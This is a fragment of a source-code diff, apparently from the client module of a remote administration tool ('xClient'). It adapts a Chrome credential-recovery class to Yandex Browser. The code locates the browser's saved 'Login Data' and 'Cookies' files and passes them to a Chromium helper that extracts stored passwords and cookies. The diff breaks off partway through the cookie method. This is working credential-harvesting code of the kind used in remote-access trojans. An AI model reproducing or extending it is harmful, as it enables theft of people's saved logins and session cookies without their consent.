@@ -1,32 +1,33 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.IO;
-using xClient.Core.Recovery.Helper;
+using xClient.Core.Recovery.Utilities;
+using xClient.Core.Utilities;
 
-namespace PasswordRecovery.Browsers
+namespace xClient.Core.Recovery.Browsers
 {
-    public class Chrome
+    public class Yandex
     {
-        public static List<LoginInfo> Passwords()
+        public static List<LoginInfo> GetSavedPasswords()
         {
             try
             {
                 string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
-                "Google\\Chrome\\User Data\\Default\\Login Data");
-                return ChromiumBase.Passwords(datapath, "Chrome");
+                "Yandex\\YandexBrowser\\User Data\\Default\\Login Data");
+                return ChromiumBase.Passwords(datapath, "Yandex");
             }
             catch (Exception)
             {
                 return new List<LoginInfo>();
             }
         }
-        public static List<ChromiumBase.ChromiumCookie> Cookies()
+        public static List<ChromiumBase.ChromiumCookie> GetSavedCookies()
         {
             try
             {
                 string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
-                "Google\\Chrome\\User Data\\Default\\Cookies");
-                return ChromiumBase.Cookies(datapath, "Chrome");
+                "Yandex\\YandexBrowser\\User Data\\Default\\Cookies");
+                return ChromiumBase.Cookies(datapath, "Yandex");
             }
             catch (Exception)
             {
